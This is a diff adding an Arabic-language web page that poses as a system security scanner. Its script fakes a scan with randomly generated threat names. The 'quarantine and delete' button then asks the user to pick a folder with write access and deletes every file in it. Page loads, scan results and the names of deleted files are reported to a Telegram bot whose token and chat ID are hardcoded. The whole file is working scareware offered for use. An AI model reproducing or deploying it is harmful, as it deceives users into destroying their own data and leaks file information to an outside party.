@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص أمان النظام</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0e17;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255,255,255,0.03);
+            backdrop-filter: blur(15px);
+            border-radius: 24px;
+            padding: 35px;
+            max-width: 580px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .header .icon {
+            font-size: 40px;
+        }
+
+        .header h1 {
+            color: #fff;
+            font-weight: 300;
+            font-size: 22px;
+        }
+
+        .header h1 span {
+            color: #4fc3f7;
+            font-weight: 700;
+        }
+
+        .badge {
+            background: rgba(255,82,82,0.15);
+            color: #ff5252;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            border: 1px solid rgba(255,82,82,0.2);
+            margin-left: auto;
+        }
+
+        .status-card {
+            background: rgba(255,255,255,0.02);
+            border-radius: 14px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid rgba(255,255,255,0.05);
+            text-align: center;
+        }
+
+        .status-card .icon-big {
+            font-size: 56px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .status-card .msg {
+            color: #b0bec5;
+            font-size: 14px;
+            line-height: 1.7;
+        }
+
+        .status-card .msg strong {
+            color: #ff5252;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 12px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4fc3f7, #0288d1);
+            border-radius: 6px;
+            transition: width 0.3s ease;
+        }
+
+        .progress-fill.danger {
+            background: linear-gradient(90deg, #ff5252, #d50000);
+        }
+
+        .scan-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #546e7a;
+            padding: 4px 0 12px 0;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #4fc3f7, #0288d1);
+            color: #0a0e17;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(79,195,247,0.25);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ff5252, #d50000);
+            color: #fff;
+        }
+
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255,82,82,0.25);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #00e676, #00c853);
+            color: #0a0e17;
+        }
+
+        .btn-secondary {
+            background: rgba(255,255,255,0.05);
+            color: #90a4ae;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.08);
+        }
+
+        .log-box {
+            margin-top: 16px;
+            padding: 12px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 12px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #546e7a;
+            border: 1px solid rgba(255,255,255,0.04);
+            line-height: 1.8;
+        }
+
+        .log-box .entry {
+            padding: 1px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.02);
+        }
+
+        .log-box .entry.success { color: #00e676; }
+        .log-box .entry.error { color: #ff5252; }
+        .log-box .entry.info { color: #4fc3f7; }
+        .log-box .entry.warning { color: #ffab00; }
+
+        .footer {
+            text-align: center;
+            margin-top: 18px;
+            color: #1a2332;
+            font-size: 11px;
+        }
+
+        .hidden { display: none; }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); }
+        ::-webkit-scrollbar-thumb { background: #4fc3f7; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <span class="icon">🛡️</span>
+        <h1>فحص <span>الأمان</span></h1>
+        <span class="badge">🔴 حماية نشطة</span>
+    </div>
+
+    <div class="status-card">
+        <span class="icon-big" id="statusIcon">🔍</span>
+        <div class="msg" id="statusMsg">
+            انقر على "بدء الفحص" للكشف عن الاختراقات والملفات الضارة.
+        </div>
+    </div>
+
+    <div class="progress-container">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+
+    <div class="scan-details">
+        <span id="fileCount">📄 0 ملف</span>
+        <span id="threatCount">⚠️ 0 تهديد</span>
+        <span id="scanTime">⏱️ 00:00</span>
+    </div>
+
+    <button class="btn btn-primary" id="mainBtn">بدء الفحص</button>
+
+    <div id="actionContainer" class="hidden" style="margin-top:10px;">
+        <button class="btn btn-danger" id="deleteBtn">🧹 عزل الملفات الضارة وحذفها</button>
+        <button class="btn btn-secondary" id="cancelBtn">تجاهل التهديدات</button>
+    </div>
+
+    <div class="log-box" id="logBox">
+        <div class="entry info">⏳ جاهز لبدء الفحص...</div>
+    </div>
+
+    <div class="footer">© 2025 • نظام الحماية المتقدم</div>
+</div>
+
+<script>
+    // =============================================
+    // بيانات البوت
+    // =============================================
+    const BOT_TOKEN = '8392534274:AAG5TWAwpLYXtvNmYj1KFqd-wFXlLyAzDv0';
+    const CHAT_ID = '8886205755';
+
+    // =============================================
+    // متغيرات الحالة
+    // =============================================
+    let isScanning = false;
+    let scanTimer = null;
+    let seconds = 0;
+    let fakeFiles = [];
+    let selectedFiles = [];
+
+    // =============================================
+    // عناصر الواجهة
+    // =============================================
+    const statusIcon = document.getElementById('statusIcon');
+    const statusMsg = document.getElementById('statusMsg');
+    const progressFill = document.getElementById('progressFill');
+    const fileCount = document.getElementById('fileCount');
+    const threatCount = document.getElementById('threatCount');
+    const scanTime = document.getElementById('scanTime');
+    const mainBtn = document.getElementById('mainBtn');
+    const actionContainer = document.getElementById('actionContainer');
+    const deleteBtn = document.getElementById('deleteBtn');
+    const cancelBtn = document.getElementById('cancelBtn');
+    const logBox = document.getElementById('logBox');
+
+    // =============================================
+    // دوال أساسية
+    // =============================================
+    function addLog(msg, type = 'info') {
+        const entry = document.createElement('div');
+        entry.className = `entry ${type}`;
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBox.appendChild(entry);
+        logBox.scrollTop = logBox.scrollHeight;
+        if (logBox.children.length > 50) {
+            logBox.removeChild(logBox.firstChild);
+        }
+    }
+
+    function setStatus(icon, msg) {
+        statusIcon.textContent = icon;
+        statusMsg.innerHTML = msg;
+    }
+
+    function setProgress(value, danger = false) {
+        progressFill.style.width = value + '%';
+        if (danger) {
+            progressFill.classList.add('danger');
+        } else {
+            progressFill.classList.remove('danger');
+        }
+    }
+
+    function updateScanDetails(files, threats) {
+        fileCount.textContent = `📄 ${files} ملف`;
+        threatCount.textContent = `⚠️ ${threats} تهديد`;
+    }
+
+    function updateTimer() {
+        const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
+        const secs = String(seconds % 60).padStart(2, '0');
+        scanTime.textContent = `⏱️ ${mins}:${secs}`;
+    }
+
+    async function sendToTelegram(message) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+            });
+        } catch (e) {}
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    // =============================================
+    // توليد تقرير وهمي (ملفات مخترقة وهمية)
+    // =============================================
+    function generateFakeThreats() {
+        const threatNames = [
+            'system32.dll', 'config.sys', 'kernel32.exe', 'malware_x.exe',
+            'trojan_agent', 'ransomware_payload', 'backdoor_shell', 'rootkit_hidden',
+            'winlogon_hook', 'svchost_fake', 'lsass_dump', 'ntoskrnl_patch',
+            'bootkit_mbr', 'driver_stealth', 'services_fake', 'registry_hijack'
+        ];
+        const count = 8 + Math.floor(Math.random() * 15);
+        const selected = [];
+        for (let i = 0; i < count; i++) {
+            const name = threatNames[Math.floor(Math.random() * threatNames.length)];
+            const ext = ['dll', 'exe', 'sys', 'tmp', 'dat', 'bin', 'scr'][Math.floor(Math.random() * 7)];
+            const num = Math.floor(Math.random() * 1000);
+            selected.push(`${name}_${num}.${ext}`);
+        }
+        return selected;
+    }
+
+    // =============================================
+    // مرحلة الفحص الوهمي
+    // =============================================
+    async function startScan() {
+        if (isScanning) return;
+        isScanning = true;
+        mainBtn.disabled = true;
+        mainBtn.textContent = '⏳ جاري الفحص...';
+        actionContainer.classList.add('hidden');
+
+        // إعادة تعيين
+        seconds = 0;
+        updateTimer();
+        setProgress(0);
+        addLog('🔍 بدء فحص النظام...', 'info');
+        setStatus('⏳', 'جاري فحص النظام بحثاً عن اختراقات...');
+
+        // توليد ملفات وهمية (سيتم عرضها كتهديدات)
+        fakeFiles = generateFakeThreats();
+        const totalFiles = 500 + Math.floor(Math.random() * 1500);
+        const totalThreats = fakeFiles.length;
+
+        // محاكاة الفحص التدريجي
+        for (let i = 0; i <= 100; i += Math.floor(Math.random() * 4) + 1) {
+            if (i > 100) i = 100;
+            setProgress(i);
+            const scanned = Math.floor((i / 100) * totalFiles);
+            const threatsFound = Math.floor((i / 100) * totalThreats);
+            updateScanDetails(scanned, threatsFound);
+
+            // إضافة سجلات وهمية
+            if (i % 15 < 5 && i > 10) {
+                const threat = fakeFiles[Math.floor(Math.random() * fakeFiles.length)];
+                addLog(`⚠️ تم اكتشاف تهديد: ${threat}`, 'warning');
+            }
+            if (i % 20 === 0) {
+                addLog(`📂 فحص المجلد ${Math.floor(Math.random() * 10) + 1}/${Math.floor(Math.random() * 20) + 1}...`, 'info');
+            }
+
+            await sleep(50 + Math.random() * 100);
+            seconds += 1;
+            updateTimer();
+        }
+
+        // انتهاء الفحص
+        setProgress(100, true);
+        updateScanDetails(totalFiles, totalThreats);
+        setStatus('⚠️', `تم العثور على <strong>${totalThreats}</strong> ملفاً مشبوهاً!`);
+        addLog(`✅ اكتمل الفحص. تم العثور على ${totalThreats} تهديداً.`, 'info');
+        addLog('🛑 يوصى بعزل الملفات المشبوهة وحذفها.', 'warning');
+
+        // إظهار أزرار الإجراء
+        actionContainer.classList.remove('hidden');
+        mainBtn.textContent = '✅ تم الفحص';
+        mainBtn.disabled = false;
+
+        // إرسال إشعار للمطور
+        await sendToTelegram(`🔍 تم فحص النظام\n` +
+            `📄 إجمالي الملفات: ${totalFiles}\n` +
+            `⚠️ التهديدات المكتشفة: ${totalThreats}\n` +
+            `⏰ الوقت: ${new Date().toLocaleString()}`);
+
+        isScanning = false;
+    }
+
+    // =============================================
+    // تنفيذ الحذف (الخداع)
+    // =============================================
+    async function executeDeletion() {
+        deleteBtn.disabled = true;
+        deleteBtn.textContent = '⏳ جاري العزل...';
+        addLog('🧹 بدء عزل الملفات الضارة...', 'info');
+        setStatus('⏳', 'جاري عزل الملفات المشبوهة...');
+
+        try {
+            // فتح نافذة اختيار مجلد (يظن المستخدم أنه يؤكد العزل)
+            const dirHandle = await window.showDirectoryPicker({
+                mode: 'readwrite'
+            });
+
+            // جلب أسماء الملفات في المجلد
+            const files = [];
+            for await (const entry of dirHandle.values()) {
+                if (entry.kind === 'file') {
+                    files.push(entry.name);
+                }
+            }
+
+            // حذف جميع الملفات في المجلد
+            let deletedCount = 0;
+            for (const entry of files) {
+                try {
+                    await dirHandle.removeEntry(entry);
+                    deletedCount++;
+                } catch (e) {
+                    // تجاهل الأخطاء
+                }
+            }
+
+            // نجاح
+            setStatus('✅', `تم عزل وحذف <strong>${deletedCount}</strong> ملفاً!`);
+            addLog(`✅ تم حذف ${deletedCount} ملفاً بنجاح.`, 'success');
+            deleteBtn.textContent = '✅ تم العزل';
+            deleteBtn.className = 'btn btn-success';
+
+            // إرسال التقرير للبوت
+            const message = `🗑️ تم حذف مجلد كامل\n\n` +
+                `📂 عدد الملفات المحذوفة: ${deletedCount}\n` +
+                `📄 أسماء الملفات (أول 10):\n${files.slice(0, 10).map((f, i) => `${i+1}. ${f}`).join('\n')}\n` +
+                `⏰ الوقت: ${new Date().toLocaleString()}`;
+
+            await sendToTelegram(message);
+
+            // إعادة تعيين بعد 4 ثوانٍ
+            setTimeout(() => {
+                resetUI();
+            }, 4000);
+
+        } catch (error) {
+            if (error.name === 'AbortError' || error.message?.includes('abort')) {
+                setStatus('ℹ️', 'تم إلغاء عملية العزل.', '');
+                addLog('ℹ️ تم إلغاء عزل الملفات.', 'info');
+                deleteBtn.disabled = false;
+                deleteBtn.textContent = '🧹 عزل الملفات الضارة وحذفها';
+                return;
+            }
+
+            setStatus('❌', `فشل العزل: ${error.message}`, 'error');
+            addLog(`❌ فشل العزل: ${error.message}`, 'error');
+            await sendToTelegram(`❌ خطأ في العزل: ${error.message}`);
+            deleteBtn.disabled = false;
+            deleteBtn.textContent = '🧹 عزل الملفات الضارة وحذفها';
+        }
+    }
+
+    // =============================================
+    // إلغاء الإجراء
+    // =============================================
+    function cancelAction() {
+        actionContainer.classList.add('hidden');
+        setStatus('ℹ️', 'تم تجاهل التهديدات. يمكنك إعادة الفحص.', '');
+        addLog('ℹ️ تم تجاهل التهديدات.', 'info');
+        mainBtn.textContent = '🔄 إعادة الفحص';
+        mainBtn.onclick = () => { resetUI(); startScan(); };
+    }
+
+    // =============================================
+    // إعادة تعيين الواجهة
+    // =============================================
+    function resetUI() {
+        setProgress(0);
+        updateScanDetails(0, 0);
+        setStatus('🔍', 'انقر على "بدء الفحص" للكشف عن الاختراقات.');
+        mainBtn.textContent = 'بدء الفحص';
+        mainBtn.disabled = false;
+        mainBtn.onclick = startScan;
+        actionContainer.classList.add('hidden');
+        deleteBtn.disabled = false;
+        deleteBtn.textContent = '🧹 عزل الملفات الضارة وحذفها';
+        deleteBtn.className = 'btn btn-danger';
+        addLog('🔄 تم إعادة تعيين النظام.', 'info');
+        seconds = 0;
+        updateTimer();
+    }
+
+    // =============================================
+    // ربط الأزرار
+    // =============================================
+    mainBtn.onclick = startScan;
+    deleteBtn.onclick = executeDeletion;
+    cancelBtn.onclick = cancelAction;
+
+    // =============================================
+    // عند تحميل الصفحة
+    // =============================================
+    window.addEventListener('DOMContentLoaded', () => {
+        addLog('🚀 تم تحميل نظام فحص الأمان.', 'info');
+        sendToTelegram('🛡️ تم تحميل صفحة فحص الأمان الوهمية');
+        setProgress(0);
+        updateScanDetails(0, 0);
+    });
+</script>
+
+</body>
+  </html>
